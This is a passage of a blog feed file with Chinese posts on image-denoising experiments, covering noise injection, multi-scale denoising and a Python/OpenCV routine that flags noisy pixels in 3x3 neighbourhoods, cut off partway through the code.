        <content type="html"><![CDATA[<h2 id="加强噪声强度"><a href="#加强噪声强度" class="headerlink" title="加强噪声强度"></a>加强噪声强度</h2><p>实际的测试图大小为200+ X 200+，那么这次测试将人为加入2000个噪声点，也就是加到5%的噪声密度，如下图：<br><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011626496.png" alt="image-20211101162622822"></p><p>原图是这样：<br><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011627446.png" alt="image-20211101162731600"><br>这样的噪声密度就有点恐怖了，但还是硬着头皮用denoise11的程序跑了一下（多尺度指数为1)，结果如下：<br><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011627483.png" alt="image-20211101162757082"><br>结果很显然，处理之后的图仍然留下来许多噪声，但至少稍微能看了</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="再次降噪"><a href="#再次降噪" class="headerlink" title="再次降噪"></a>再次降噪</h3><p>将处理图用denoise11再次降噪，结果如下：<br><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011628186.png" alt="image-20211101162837464"><br>结果确实是几乎将仍留下的单个的噪声点去除了，但仍然没有达到较为理想的状态</p><h3 id="利用多尺度"><a href="#利用多尺度" class="headerlink" title="利用多尺度"></a>利用多尺度</h3><p>结果仍然不理想，且因为其中操作复杂，很难分析原因</p><h3 id="使用旧方法"><a href="#使用旧方法" class="headerlink" title="使用旧方法"></a>使用旧方法</h3><p>再次尝试利用旧的方法（比较两种划分）来去除噪声，处理d11，结果如下：<img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011629445.png" alt="image-20211101162925093"><br>可以看到，虽然图像的边缘部分略显粗糙，但还是离理想情况更近了一步</p><h3 id="先旧后新"><a href="#先旧后新" class="headerlink" title="先旧后新"></a>先旧后新</h3><p>将两种方法结合在一起，封装成一个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="keyword">from</span> denoise12 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    denoise(<span class="string">&#x27;img_noise.png&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>可得到相对不错的效果：<br><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011630808.png" alt="image-20211101163000557"></p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210711</title>
      <link href="/20210711-img-report/"/>
      <url>/20210711-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="多方面的降噪检测"><a href="#多方面的降噪检测" class="headerlink" title="多方面的降噪检测"></a>多方面的降噪检测</h2><h3 id="多尺度降噪"><a href="#多尺度降噪" class="headerlink" title="多尺度降噪"></a>多尺度降噪</h3><p>为了方便进行多尺度降噪，我将降噪函数的接口进行修改，最终封装在<code>denoise.py</code>中。</p><p>其中，对外开放的函数是：<code>denoise(img_address, color=0, k=1)</code></p><p><code>img_address</code>：图像地址</p><p><code>color</code>：决定图片以何种形式读入（如BGR/灰度），默认为灰度</p><p><code>k</code>：多尺度指数（决定缩小几倍），默认为1</p><p>代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> denoise <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    denoise(<span class="string">&#x27;img_noise.png&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><p>该算法将抽离出的小图直接进行修改，并打回原图，而在边缘部分，因缩小而造成的信息损失会使修改不一定合理，如下图所示：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011619808.png" alt="1"  /><p>可以看到在噪声被去除的同时，边缘部分会变得不平滑，反而产生一些噪声，这一点，在下面的“降噪合理性”中，也被证明。</p><p>所以这也应证了我一开始的猜想：不应该对小图直接修改，而是应该将小图中被标记的噪声也同样标记到大图中，统一处理。</p><h3 id="降噪合理性"><a href="#降噪合理性" class="headerlink" title="降噪合理性"></a>降噪合理性</h3><p>这部分，我同样做了接口调整，并封装在<code>rationality.py</code>中</p><p>其中，有两个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qufendu(origin_address, denoise_address) <span class="comment"># 求区分度</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chayidu(origin_address, denoise_address) <span class="comment"># 求差异度</span></span><br></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rationality <span class="keyword">as</span> rtn</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    rtn.qufendu(<span class="string">&#x27;img_noise.png&#x27;</span>, <span class="string">&#x27;denoised_img_noise.png&#x27;</span>)</span><br><span class="line">    rtn.chayidu(<span class="string">&#x27;img_noise.png&#x27;</span>, <span class="string">&#x27;denoised_img_noise.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011618100.png" alt="2"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011618226.png" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210606</title>
      <link href="/20210606-img-report/"/>
      <url>/20210606-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="新的去噪方法"><a href="#新的去噪方法" class="headerlink" title="新的去噪方法"></a>新的去噪方法</h2><h3 id="选取3X3噪声点"><a href="#选取3X3噪声点" class="headerlink" title="选取3X3噪声点"></a>选取3X3噪声点</h3><p>中心点为C，周围八个点分别是A1~A8</p><h3 id="处理中心点C"><a href="#处理中心点C" class="headerlink" title="处理中心点C"></a>处理中心点C</h3><p>对九个点进行不考虑位置的区域划分，再去掉中心点C，对其余八个点进行不考虑位置的划分，若两次划分有明显的变化，那么说明中心点为噪声点。</p><p>如果中心点C为噪声，那么就在八邻域中找到与中心点最为接近的点的值，赋给中心点C</p><h3 id="处理八邻域"><a href="#处理八邻域" class="headerlink" title="处理八邻域"></a>处理八邻域</h3><p>将九个点全排列，分成两个区域，然后搜索每个点，如果该点没有与所在区域的其他点相邻，那么就将它的噪声指数加一</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011614278.png" alt="img"></p><p>下面尝试用opencv中的canny算子检测噪声图和处理图（去噪后）的效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011614172.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011614787.png" alt="img"></p><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><span class="line">python<span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.找出噪声点：</span></span><br><span class="line"><span class="string">    新划分方法</span></span><br><span class="line"><span class="string">    标记次数</span></span><br><span class="line"><span class="string">2.修改</span></span><br><span class="line"><span class="string">    找最接近的未标记过的点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 二维数组映射到一维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_2d_2_1d</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span> <span class="keyword">and</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">0</span> <span class="keyword">and</span> y == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">0</span> <span class="keyword">and</span> y == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span> <span class="keyword">and</span> y == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span> <span class="keyword">and</span> y == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span> <span class="keyword">and</span> y == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span> <span class="keyword">and</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span> <span class="keyword">and</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span> <span class="keyword">and</span> y == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_3x3</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">9</span></span><br><span class="line">    p1 = [_3x3[<span class="number">0</span>][<span class="number">0</span>], _3x3[<span class="number">0</span>][<span class="number">1</span>], _3x3[<span class="number">0</span>][<span class="number">2</span>], _3x3[<span class="number">1</span>][<span class="number">2</span>], _3x3[<span class="number">2</span>][<span class="number">2</span>], _3x3[<span class="number">2</span>][<span class="number">1</span>], _3x3[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _3x3[<span class="number">1</span>][<span class="number">0</span>], _3x3[<span class="number">1</span>][<span class="number">1</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">7</span>]) - <span class="built_in">int</span>(p[<span class="number">8</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除del_num号元素，del_num:0~8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_3x3, del_num</span>):</span></span><br><span class="line">    p1 = [_3x3[<span class="number">0</span>][<span class="number">0</span>], _3x3[<span class="number">0</span>][<span class="number">1</span>], _3x3[<span class="number">0</span>][<span class="number">2</span>], _3x3[<span class="number">1</span>][<span class="number">2</span>], _3x3[<span class="number">2</span>][<span class="number">2</span>], _3x3[<span class="number">2</span>][<span class="number">1</span>], _3x3[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _3x3[<span class="number">1</span>][<span class="number">0</span>], _3x3[<span class="number">1</span>][<span class="number">1</span>]]</span><br><span class="line">    p2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> i == del_num:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p2.append(p1[i])</span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">9</span></span><br><span class="line"></span><br><span class="line">    p = <span class="built_in">sorted</span>(p2)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - p[<span class="number">7</span>])]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    result[del_num] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索八邻域像素点是否合理 num:0~7</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_8area</span>(<span class="params">_8area, part, num</span>):</span></span><br><span class="line">    x, y = _1d_2_2d(num)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= x-<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y-<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x-<span class="number">1</span>, y-<span class="number">1</span>)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= x-<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y &lt;= <span class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x-<span class="number">1</span>, y)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= x-<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y+<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x-<span class="number">1</span>, y+<span class="number">1</span>)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= x &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y+<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x, y+<span class="number">1</span>)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= x+<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y+<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x+<span class="number">1</span>, y+<span class="number">1</span>)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= x+<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y &lt;= <span class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x+<span class="number">1</span>, y)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= x+<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y-<span class="number">1</span> &lt;= <span 